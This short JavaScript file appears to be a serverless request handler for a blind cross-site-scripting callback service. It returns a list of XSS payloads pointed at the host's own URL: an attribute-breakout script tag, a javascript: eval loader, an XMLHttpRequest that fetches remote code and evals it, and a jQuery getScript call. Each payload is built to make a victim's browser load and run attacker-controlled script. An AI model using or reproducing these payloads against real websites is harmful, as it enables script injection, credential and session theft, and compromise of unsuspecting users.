export async function onRequest(context) {
  const url = new URL(context.request.url);
  const baseUrl = `${url.protocol}//${url.host}`;
  
  let page = "";
  page += `\'"><script src="${baseUrl}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${baseUrl}\\';document.body.appendChild(a)')\n\n`;
  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${baseUrl}");a.send();</script>\n\n`;
  page += `<script>$.getScript("${baseUrl}")</script>`;

  return new Response(page, {
    headers: { "Content-Type": "text/plain" }
  });
}
